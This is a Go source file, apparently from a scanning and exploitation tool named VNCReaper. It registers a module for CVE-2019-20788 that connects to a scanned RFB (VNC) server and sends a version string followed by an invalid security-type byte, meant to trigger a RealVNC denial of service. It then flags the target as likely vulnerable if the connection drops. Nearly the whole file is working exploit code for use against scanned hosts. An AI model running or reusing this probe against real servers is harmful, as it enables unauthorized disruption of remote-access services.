package cves

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/comedymoon/VNCReaper/internal/types"
)

// CVE-2019-20788 - RealVNC 5.x denial-of-service via crafted handshake
type CVE2019_20788 struct{}

func (c CVE2019_20788) Name() string {
	return "CVE-2019-20788"
}

func (c CVE2019_20788) Description() string {
	return "RealVNC 5.x DoS via crafted RFB protocol handshake."
}

func (c CVE2019_20788) Exploit(target types.ScanResult) (bool, string) {
	// Only RFB servers are relevant
	if !strings.EqualFold(target.Protocol, "RFB") {
		return false, ""
	}

	address := net.JoinHostPort(target.IP, target.Port)
	conn, err := net.DialTimeout("tcp", address, 5*time.Second)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	// Send RFB version, then immediately send malformed security type
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	_, _ = conn.Write([]byte("RFB 003.008\n"))
	_, _ = conn.Write([]byte{255}) // invalid security type

	// If the server closes abruptly without proper error, it might be vulnerable
	buf := make([]byte, 8)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return true, fmt.Sprintf("Server at %s likely vulnerable to CVE-2019-20788 (DoS)", address)
	}

	return false, ""
}

func init() {
	Register(CVE2019_20788{})
}